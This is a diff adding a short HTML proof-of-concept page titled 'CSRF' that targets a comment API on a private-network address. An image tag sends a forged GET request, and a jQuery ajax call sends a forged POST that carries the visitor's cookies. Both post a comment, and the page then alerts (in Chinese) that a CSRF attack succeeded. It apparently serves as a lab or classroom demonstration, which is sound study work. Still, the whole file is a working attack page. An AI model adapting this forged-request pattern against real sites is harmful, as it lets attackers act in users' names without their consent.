@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF</title>
+</head>
+
+<body>
+    <div>
+        <img src="http://10.0.10.216:8688/api/comment/newComment?content=通过get提交的csrf攻击">
+    </div>
+    <script type="text/javascript" src="./jquery.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function() {
+        $.ajax({
+            url: 'http://10.0.10.216:8688/api/comment/addComment',
+            method: 'post',
+            data: {
+                content: '这是一条POST提交的CSRF攻击'
+            },
+            xhrFields: {
+                withCredentials: true
+            },
+            success: function(res) {
+                if (res.code === '0') {
+                    alert('你遭受了CSRF攻击');
+                } else {
+                    alert(res.msg);
+                }
+            },
+            error: function(err) {
+                alert(err);
+            }
+        })
+    })
+    </script>
+</body>
+
+</html>
